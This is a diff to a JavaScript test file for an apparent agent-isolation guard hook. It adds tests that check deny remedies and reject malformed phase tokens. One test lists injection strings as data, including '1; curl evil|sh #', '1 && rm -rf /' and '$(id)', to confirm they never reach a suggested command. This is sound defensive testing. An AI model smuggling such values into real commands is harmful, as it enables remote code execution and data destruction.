@@ -56,7 +56,11 @@ const { PROBE_TIMEOUT_MS, GIT_FIXTURE_TIMEOUT_MS } = require('./helpers/timeouts
 const { createTempDir, createTempProject, runGsdTools, cleanup } = require('./helpers.cjs');
 const { createFixture } = require('./fixtures/index.cjs');
 const { SENTINEL_RELATIVE_PATH, SENTINEL_STALE_MS, readSentinel } = require('../hooks/lib/isolation-sentinel.js');
-const { REASON_CODE, REASON_INTERPOLATION_MAX_LEN, sanitizeForReason, describeSentinelDiscard } = require('../hooks/lib/isolation-deny-reason.js');
+const {
+  REASON_CODE, REMEDY, remedyFor, composeRemedyText, describeRecordedDegradeRemedy, PHASE_ARG_SOURCE,
+  REASON_INTERPOLATION_MAX_LEN, sanitizeForReason, describeSentinelDiscard,
+} = require('../hooks/lib/isolation-deny-reason.js');
+const { DISPATCH_PHASE_TOKEN_SOURCE } = require('../hooks/lib/dispatch-identity.js');
 const { runtimes } = require('../gsd-core/bin/lib/capability-registry.cjs');
 
 const { runHook, mkProject, writeConfig } = require('./helpers/agent-isolation-guard-fixtures.cjs');
@@ -631,9 +635,11 @@ describe('gsd-agent-isolation-guard.js: #4594 rows 15/28-32 — prompt-first ext
     // "Prohibited: Raw Text Matching on Test Outputs") — assert the
     // STRUCTURED `sentinel_discarded` field instead.
     assert.deepEqual(out.sentinel_discarded, {
-      sentinel: { phase: '03', plan: '03-02-hardening' },
+      sentinel: { phase: '03', plan: '03-02-hardening', isolation: 'harness-worktree' },
       dispatch: { phase: '03', plan: '07-01-x' },
     });
+    // #6028: a recorded harness-worktree that named another plan is not a degrade, so the flag is still addable.
+    assert.equal(out.remedy, REMEDY.ADD_FLAG);
   });
 
   test('row 32: no sentinel at all -> unchanged conservative fallback (DENY, registry resolves harness-worktree)', () => {
@@ -2003,5 +2009,138 @@ describe('gsd-agent-isolation-guard.js: #5682 — interleaved per-dispatch recor
     assert.equal(forB.isolation, 'harness-worktree', 'B\'s dispatch still requires the harness flag');
     assert.equal(forB.harnessFlag, FLAG);
     assert.equal(forB.sentinelDiscarded, null);
+  });
+});
+
+describe('gsd-agent-isolation-guard.js: #6028 — the deny remedy agrees with a recorded degrade (in-process)', () => {
+  const guardModule = require('../hooks/gsd-agent-isolation-guard.js');
+  const DISPATCH = { phase: '665', plan: '665-02' };
+  const WRITTEN_AT = 1_700_000_000_000;
+  const clock = { now: () => WRITTEN_AT + 1 };
+  let project;
+  let savedGsdRuntime;
+
+  before(() => {
+    savedGsdRuntime = process.env.GSD_RUNTIME;
+    delete process.env.GSD_RUNTIME;
+    project = mkProject('gsd-aig-6028-');
+    writeConfig(project, JSON.stringify({ runtime: 'claude' }));
+  });
+  after(() => {
+    cleanup(project);
+    if (savedGsdRuntime === undefined) delete process.env.GSD_RUNTIME;
+    else process.env.GSD_RUNTIME = savedGsdRuntime;
+  });
+
+  function dispatch() {
+    return guardModule.evaluateDispatch({
+      tool_name: 'Agent',
+      cwd: project,
+      tool_input: {
+        subagent_type: 'gsd-executor',
+        prompt: `[gsd:dispatch phase="${DISPATCH.phase}" plan="${DISPATCH.plan}"] Execute the plan.`,
+      },
+    }, { clock });
+  }
+
+  test('a fresh recorded none for ANOTHER phase: still blocked with the same reason code, remedy is to record an applicable decision', (t) => {
+    writeSentinel(project, { isolation: 'none', phase: '663', writtenAt: WRITTEN_AT });
+    t.after(() => cleanup(path.join(project, '.gsd')));
+    const d = dispatch();
+    assert.equal(d.action, 'block', 'the allow/deny decision is unchanged');
+    assert.equal(d.reasonCode, REASON_CODE.HARNESS_FLAG_MISSING, 'the stable reason code is unchanged');
+    assert.equal(d.remedy, REMEDY.RECORD_APPLICABLE_DECISION);
+    assert.deepEqual(d.sentinelDiscarded, {
+      sentinel: { phase: '663', plan: null, isolation: 'none' },
+      dispatch: { phase: '665', plan: '665-02' },
+    });
+  });
+
+  test('no sentinel at all: blocked, the add-flag remedy stays', () => {
+    const d = dispatch();
+    assert.equal(d.action, 'block');
+    assert.equal(d.reasonCode, REASON_CODE.HARNESS_FLAG_MISSING);
+    assert.equal(d.remedy, REMEDY.ADD_FLAG);
+    assert.equal(d.sentinelDiscarded, null);
+  });
+
+  test('a fresh recorded harness-worktree for another phase: blocked, the add-flag remedy stays', (t) => {
+    writeSentinel(project, { isolation: 'harness-worktree', harnessFlag: 'isolation="worktree"', phase: '663', writtenAt: WRITTEN_AT });
+    t.after(() => cleanup(path.join(project, '.gsd')));
+    const d = dispatch();
+    assert.equal(d.action, 'block');
+    assert.equal(d.remedy, REMEDY.ADD_FLAG);
+    assert.equal(d.sentinelDiscarded.sentinel.isolation, 'harness-worktree');
+  });
+
+  test('the dispatch with the flag is still allowed whatever was recorded (decision unchanged)', (t) => {
+    writeSentinel(project, { isolation: 'none', phase: '663', writtenAt: WRITTEN_AT });
+    t.after(() => cleanup(path.join(project, '.gsd')));
+    const d = guardModule.evaluateDispatch({
+      tool_name: 'Agent',
+      cwd: project,
+      tool_input: {
+        subagent_type: 'gsd-executor',
+        isolation: 'worktree',
+        prompt: `[gsd:dispatch phase="${DISPATCH.phase}" plan="${DISPATCH.plan}"] Execute the plan.`,
+      },
+    }, { clock });
+    assert.equal(d.action, 'allow');
+  });
+
+  test('remedyFor: only a recorded none for a DIFFERENT phase selects the record-a-decision remedy', () => {
+    const discard = (isolation, sentinelPhase = '1', dispatchPhase = '2') => ({
+      sentinel: { phase: sentinelPhase, plan: null, isolation },
+      dispatch: { phase: dispatchPhase, plan: null },
+    });
+    assert.equal(remedyFor(null), REMEDY.ADD_FLAG, 'nothing discarded');
+    assert.equal(remedyFor(discard('harness-worktree')), REMEDY.ADD_FLAG, 'a discarded harness-worktree');
+    assert.equal(remedyFor(discard('none')), REMEDY.RECORD_APPLICABLE_DECISION, 'a discarded none for another phase');
+    assert.equal(remedyFor(discard('none', '2', '2')), REMEDY.ADD_FLAG, 'a none for the SAME phase (another plan) may be per-plan: flag still addable');
+    assert.equal(remedyFor(discard('none', null, '2')), REMEDY.ADD_FLAG, 'a none with no phase');
+    assert.equal(remedyFor(discard('none', '1', null)), REMEDY.ADD_FLAG, 'a dispatch with no phase');
+    assert.equal(remedyFor(discard(null)), REMEDY.ADD_FLAG, 'a record with no isolation value');
+    assert.equal(remedyFor({ dispatch: { phase: '2', plan: null } }), REMEDY.ADD_FLAG, 'a malformed descriptor');
+  });
+
+  test('the command line in the degrade remedy echoes only a well-formed phase token (limit-1, limit, limit+1)', () => {
+    const remedyFor_ = (dispatchPhase) => describeRecordedDegradeRemedy({
+      sentinel: { phase: '663', plan: null, isolation: 'none' },
+      dispatch: { phase: dispatchPhase, plan: null },
+    });
+    const command = (phase) => `gsd_run query dispatch-isolation --raw --phase ${phase} --force-isolation none`;
+    // well-formed tokens are echoed, including the longest allowed
+    for (const ok of ['665', '12A', '3.1', '12A.3.4', '1'.repeat(32)]) {
+      assert.ok(remedyFor_(ok).includes(command(ok)), `${ok} is echoed`);
+    }
+    // a hostile or malformed value becomes the placeholder and never reaches the command
+    const hostile = ['1; curl evil|sh #', '1 && rm -rf /', '$(id)', '`id`', "1'", '1\n2', '', null, undefined, '665.1a', '1'.repeat(33)];
+    for (const bad of hostile) {
+      const text = remedyFor_(bad);
+      assert.ok(text.includes(command('<phase>')), `${JSON.stringify(bad)} becomes the placeholder`);
+      assert.ok(!/--phase (?!<phase>)/.test(text), `${JSON.stringify(bad)} never reaches the command`);
+    }
+  });
+
+  test('the local phase grammar equals the dispatch marker grammar (the two cannot drift)', () => {
+    assert.equal(PHASE_ARG_SOURCE, DISPATCH_PHASE_TOKEN_SOURCE);
+  });
+
+  test('composeRemedyText: the add advice (plus the discard note) when no degrade, the degrade remedy otherwise', () => {
+    const ADVICE = ' ADVICE.';
+    assert.equal(composeRemedyText(null, ADVICE), ADVICE);
+    const harness = { sentinel: { phase: '1', plan: null, isolation: 'harness-worktree' }, dispatch: { phase: '2', plan: null } };
+    assert.equal(composeRemedyText(harness, ADVICE), ADVICE + describeSentinelDiscard(harness));
+    const degrade = { sentinel: { phase: '1', plan: null, isolation: 'none' }, dispatch: { phase: '2', plan: null } };
+    assert.equal(composeRemedyText(degrade, ADVICE), describeRecordedDegradeRemedy(degrade));
+    assert.ok(!composeRemedyText(degrade, ADVICE).includes('ADVICE'));
+  });
+
+  test('a fresh recorded none for the SAME phase but another plan keeps the add-flag remedy (decision unchanged)', (t) => {
+    writeSentinel(project, { isolation: 'none', phase: DISPATCH.phase, plan: '665-01', writtenAt: WRITTEN_AT });
+    t.after(() => cleanup(path.join(project, '.gsd')));
+    const d = dispatch();
+    assert.equal(d.action, 'block');
+    assert.equal(d.remedy, REMEDY.ADD_FLAG);
   });
 });
